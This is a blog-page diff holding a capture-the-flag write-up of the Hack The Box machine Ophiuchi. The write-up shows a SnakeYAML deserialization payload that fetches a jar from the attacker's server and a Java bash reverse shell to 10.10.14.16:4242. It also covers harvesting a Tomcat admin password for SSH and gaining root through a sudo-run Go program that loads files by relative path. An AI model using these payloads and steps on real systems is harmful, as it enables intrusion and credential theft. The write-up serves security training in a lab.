@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Ophiuchi | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2021/07/htb-ophiuchi.html" title="Read more" class="entry-title-link">
+                HTB: Ophiuchi</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2021-07-05T09:15:00+02:00">05 Jul 2021</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/linux.html" title="Read more with the label Linux" class="meta-link">Linux</a> 
+          <a href="../../tag/yaml.html" title="Read more with the label YAML" class="meta-link">YAML</a> 
+          <a href="../../tag/deserialization.html" title="Read more with the label deserialization" class="meta-link">deserialization</a> 
+          <a href="../../tag/webassembly.html" title="Read more with the label webassembly" class="meta-link">webassembly</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 7 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2021.07/ophiuchi_card.png" alt="Ophiuchi card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/315">Ophiuchi</a> created by
+<a href="https://www.hackthebox.eu/home/users/profile/27390">felamos</a> and publish on
+February 13, 2021.
+This box is classified as a medium machine. The user part involves YAML and
+deserialization as the root part involves webassembly binaries.</p>
+
+
+<h1 id="user">User</h1>
+<h2 id="reco">Reco</h2>
+<p>We start with an nmap scan. Only ports 22 (SSH) and 8080 (HTTP) are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.91 scan initiated Sat Feb 20 04:02:47 2021 as: nmap -oN notes -sS -p- 10.129.98.255</span>
+<span class="code-line">Nmap scan report for 10.129.98.255</span>
+<span class="code-line">Host is up (0.014s latency).</span>
+<span class="code-line">Not shown: 65533 closed ports</span>
+<span class="code-line">PORT     STATE SERVICE</span>
+<span class="code-line">22/tcp   open  ssh</span>
+<span class="code-line">8080/tcp open  http-proxy</span>
+<span class="code-line"></span>
+<span class="code-line"># Nmap done at Sat Feb 20 04:03:22 2021 -- 1 IP address (1 host up) scanned in 35.41 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="web">Web</h2>
+<p>The web page is an Online YAML Parser. We quickly guess that this would be about
+YAML deserialization. A few "random" data generate a Java stack trace indicating
+the use of the Snake YAML library.</p>
+<p>A Google search lead us to a
+<a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858">medium article about exploiting YAML deserialization</a></p>
+<p>We run an python http server and use the following payload</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>!!javax.script.ScriptEngineManager [</span>
+<span class="code-line">  !!java.net.URLClassLoader [[</span>
+<span class="code-line">    !!java.net.URL [&quot;http://10.10.14.16:8000&quot;]</span>
+<span class="code-line">  ]]</span>
+<span class="code-line">]</span>
+<span class="code-line"></code></pre></div>
+
+<p>Despite the "error" message on the website we still got a hit on our Python
+HTTP server.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ python3 -m http.server</span>
+<span class="code-line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+<span class="code-line">10.129.98.255 - - [20/Feb/2021 04:25:51] &quot;GET / HTTP/1.1&quot; 200 -</span>
+<span class="code-line"></code></pre></div>
+
+<p>A link in the <a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858">medium article</a>
+lead us to a <a href="https://github.com/artsploit/yaml-payload">github repository for a YAML payloads generator</a>.</p>
+<p>We change the paylaod to <code>Runtime.getRuntime().exec("wget http://10.10.14.16:8000/boom");</code>
+and send it to the YAML parser</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>!!javax.script.ScriptEngineManager [</span>
+<span class="code-line">  !!java.net.URLClassLoader [[</span>
+<span class="code-line">    !!java.net.URL [&quot;http://10.10.14.16:8000/yaml-payload.jar&quot;]</span>
+<span class="code-line">  ]]</span>
+<span class="code-line">]</span>
+<span class="code-line"></code></pre></div>
+
+<p>We got an other Java error "java.lang.UnsupportedClassVersionError: artsploit/AwesomeScriptEngineFactory has been compiled by a more recent version of the Java Runtime (class file version 60.0), this version of the Java Runtime only recognizes class file versions up to 55.0".</p>
+<p>On my Kali Linux I am using <code>openjdk</code> with Java 16 so our <code>javac</code> produced a
+newer version of the code.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>/usr/lib/jvm/java-16-openjdk-amd64/bin/javac</span>
+<span class="code-line"></code></pre></div>
+
+<p>We just install Java 11 using <code>sudo apt-get install openjdk-11-jdk</code>
+and run the specific Java 11 compiler. Then we got a hit with our "second" payload</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/pown/htb_Ophiuchi/yaml-payload$ /usr/lib/jvm/java-11-openjdk-amd64/bin/javac src/artsploit/AwesomeScriptEngineFactory.java</span>
+<span class="code-line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span>
+<span class="code-line">kali@kali:~/pown/htb_Ophiuchi/yaml-payload$ jar -cvf yaml-payload.jar -C src/ .</span>
+<span class="code-line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span>
+<span class="code-line">added manifest</span>
+<span class="code-line">adding: artsploit/(in = 0) (out= 0)(stored 0%)</span>
+<span class="code-line">adding: artsploit/AwesomeScriptEngineFactory.class(in = 1620) (out= 680)(deflated 58%)</span>
+<span class="code-line">adding: artsploit/AwesomeScriptEngineFactory.java(in = 1493) (out= 404)(deflated 72%)</span>
+<span class="code-line">ignoring entry META-INF/</span>
+<span class="code-line">adding: META-INF/services/(in = 0) (out= 0)(stored 0%)</span>
+<span class="code-line">adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)</span>
+<span class="code-line">kali@kali:~/pown/htb_Ophiuchi/yaml-payload$ python3 -m http.server</span>
+<span class="code-line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+<span class="code-line">10.129.98.255 - - [20/Feb/2021 04:47:15] &quot;GET /yaml-payload.jar HTTP/1.1&quot; 200 -</span>
+<span class="code-line">10.129.98.255 - - [20/Feb/2021 04:47:15] &quot;GET /yaml-payload.jar HTTP/1.1&quot; 200 -</span>
+<span class="code-line">10.129.98.255 - - [20/Feb/2021 04:47:15] code 404, message File not found</span>
+<span class="code-line">10.129.98.255 - - [20/Feb/2021 04:47:15] &quot;GET /boom HTTP/1.1&quot; 404 -</span>
+<span class="code-line"></code></pre></div>
+
+<p>We modify it to use the reverse shell Java payload from
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java">Payload all the things</a>
+and catch the new exception in the Java code as shown in the code block below.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="p">()</span> <span class="p">{</span></span>
+<span class="code-line">    <span class="k">try</span> <span class="p">{</span></span>
+<span class="code-line">        <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span></span>
+<span class="code-line">        <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]</span> <span class="p">{</span> <span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="s">&quot;exec 5&lt;&gt;/dev/tcp/10.10.14.16/4242;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span> <span class="p">});</span></span>
+<span class="code-line">        <span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">();</span></span>
+<span class="code-line">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">IOException</span> <span class="o">|</span> <span class="n">InterruptedException</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span></span>
+<span class="code-line">        <span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span></span>
+<span class="code-line">    <span class="p">}</span></span>
+<span class="code-line"><span class="p">}</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Running it give us a reverse shell as the <code>tomcat</code> user.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ nc -l -p 4242</span>
+<span class="code-line">id</span>
+<span class="code-line">uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="stored-credential">Stored credential</h2>
+<p>We start enumerating and found out that the user is probably <code>admin</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat /etc/passwd</span>
+<span class="code-line">root:x:0:0:root:/root:/bin/bash</span>
+<span class="code-line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span>
+<span class="code-line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span>
+<span class="code-line">tomcat:x:1001:1001::/opt/tomcat:/bin/false</span>
+<span class="code-line">admin:x:1000:1000:,,,:/home/admin:/bin/bash</span>
+<span class="code-line"></code></pre></div>
+
+<p>When looking at the directories, we found a <code>conf</code> folder containing the
+<code>tomcat-users.xml</code> file. This file classically store the user that can access
+the tomcat manager panel (which is not exposed on this box).</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ls -alR conf</span>
+<span class="code-line">conf:</span>
+<span class="code-line">total 240</span>
+<span class="code-line">drwxr-x--- 2 root tomcat   4096 Dec 28 00:37 .</span>
+<span class="code-line">drwxr-xr-x 9 root tomcat   4096 Oct 11 14:07 ..</span>
+<span class="code-line">-rw-r----- 1 root tomcat  12873 Sep 10 08:25 catalina.policy</span>
+<span class="code-line">-rw-r----- 1 root tomcat   7262 Sep 10 08:25 catalina.properties</span>
+<span class="code-line">-rw-r----- 1 root tomcat   1400 Sep 10 08:25 context.xml</span>
+<span class="code-line">-rw-r----- 1 root tomcat   1149 Sep 10 08:25 jaspic-providers.xml</span>
+<span class="code-line">-rw-r----- 1 root tomcat   2313 Sep 10 08:25 jaspic-providers.xsd</span>
+<span class="code-line">-rw-r----- 1 root tomcat   4144 Sep 10 08:25 logging.properties</span>
+<span class="code-line">-rw-r----- 1 root tomcat   7588 Sep 10 08:25 server.xml</span>
+<span class="code-line">-rw-r----- 1 root tomcat   2234 Dec 28 00:37 tomcat-users.xml</span>
+<span class="code-line">-rw-r----- 1 root tomcat   2558 Sep 10 08:25 tomcat-users.xsd</span>
+<span class="code-line">-rw-r----- 1 root tomcat 172359 Sep 10 08:25 web.xml</span>
+<span class="code-line"></code></pre></div>
+
+<p>We look at the file and found a few default username and passwords and also the
+<code>admin</code> user with the <code>whythereisalimit</code> password.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat conf/tomcat*</span>
+<span class="code-line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="code-line">&lt;!--</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;</span>
+<span class="code-line">              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
+<span class="code-line">              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span>
+<span class="code-line">        version=&quot;1.0&quot;&gt;</span>
+<span class="code-line">&lt;user username=&quot;admin&quot; password=&quot;whythereisalimit&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;</span>
+<span class="code-line">SNIP&gt;</span>
+<span class="code-line">&lt;!--</span>
+<span class="code-line">  &lt;role rolename=&quot;tomcat&quot;/&gt;</span>
+<span class="code-line">  &lt;role rolename=&quot;role1&quot;/&gt;</span>
+<span class="code-line">  &lt;user username=&quot;tomcat&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat&quot;/&gt;</span>
+<span class="code-line">  &lt;user username=&quot;both&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat,role1&quot;/&gt;</span>
+<span class="code-line">  &lt;user username=&quot;role1&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;role1&quot;/&gt;</span>
+<span class="code-line">--&gt;</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<p>We connect to the box with SSH using this user and got the first flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ #whythereisalimit</span>
+<span class="code-line">kali@kali:~$ ssh admin@10.129.98.255</span>
+<span class="code-line">admin@10.129.98.255&#39;s password:</span>
+<span class="code-line">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">admin@ophiuchi:~$ id</span>
+<span class="code-line">uid=1000(admin) gid=1000(admin) groups=1000(admin)</span>
+<span class="code-line">admin@ophiuchi:~$ cat user.txt</span>
+<span class="code-line">6aa83180b3e469e3f5de725c639a601b</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="root">Root</h1>
+<p>We enumerate the box and quickly found out that we can execute a specific go
+program as root without password.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>admin@ophiuchi:~$ sudo -l</span>
+<span class="code-line">Matching Defaults entries for admin on ophiuchi:</span>
+<span class="code-line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User admin may run the following commands on ophiuchi:</span>
+<span class="code-line">    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go</span>
+<span class="code-line"></code></pre></div>
+
+<p>The content of the "index.go" file is the following:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">package</span><span class="w"> </span><span class="nx">main</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="kn">import</span><span class="w"> </span><span class="p">(</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="s">&quot;fmt&quot;</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="nx">wasm</span><span class="w"> </span><span class="s">&quot;github.com/wasmerio/wasmer-go/wasmer&quot;</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="s">&quot;os/exec&quot;</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="s">&quot;log&quot;</span><span class="w"></span></span>
+<span class="code-line"><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="kd">func</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="nx">bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">wasm</span><span class="p">.</span><span class="nx">ReadBytes</span><span class="p">(</span><span class="s">&quot;main.wasm&quot;</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">wasm</span><span class="p">.</span><span class="nx">NewInstance</span><span class="p">(</span><span class="nx">bytes</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">defer</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="nx">init</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">Exports</span><span class="p">[</span><span class="s">&quot;info&quot;</span><span class="p">]</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="nx">result</span><span class="p">,</span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">init</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="nx">f</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">String</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">f</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">&quot;1&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;Not ready to deploy&quot;</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;Ready to deploy&quot;</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="nx">out</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">exec</span><span class="p">.</span><span class="nx">Command</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;deploy.sh&quot;</span><span class="p">).</span><span class="nx">Output</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                        </span><span class="nx">log</span><span class="p">.</span><span class="nx">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="p">}</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">))</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="p">}</span><span class="w"></span></span>
+<span class="code-line"><span class="p">}</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Basically the program read a webassemply file <code>main.wasm</code> using a relative path
+and if the file map "info" return <code>1</code> it run a bash script <code>deploy.sh</code> also
+using a relative path. We "just" need to create a new <code>main.wasm</code> that return
+<code>1</code> and a bash script that give us the root flag.</p>
+<p>We download main.wasm and "decompile" it using <a href="https://github.com/WebAssembly/wabt">wabt</a> and its online <a href="https://webassembly.github.io/wabt/demo/wasm2wat/">wasm2wat "decompiler"</a></p>
+<p>Using <a href="https://webassembly.github.io/wabt/demo/wat2wasm/">wat2wasm</a> We just change the fourth line <code>(i32.const 0))</code> to <code>(i32.const 1))</code> and download the resulting wasm file.
+We upload it on the box in our home folder and create a deploy.sh bash file to display the root flag:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/pown/htb_Ophiuchi$ scp  test.wasm  admin@10.129.98.255:main.wasm</span>
+<span class="code-line">admin@10.129.98.255&#39;s password:</span>
+<span class="code-line">test.wasm</span>
+<span class="code-line"></span>
+<span class="code-line">admin@ophiuchi:~$ echo &#39;cat /root/root.txt&#39; &gt; deploy.sh</span>
+<span class="code-line">admin@ophiuchi:~$ chmod +x deploy.sh</span>
+<span class="code-line">admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go</span>
+<span class="code-line">Ready to deploy</span>
+<span class="code-line">d153e100b32fe456e149a86ef6468ac6</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>A very interesting box that I would recommend to beginners as it is mostly
+straightforward with no rabbit hole.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2021/06/htb-scriptkiddie.html"> HTB: ScriptKiddie </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2021/07/htb-armageddon.html"> HTB: Armageddon </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
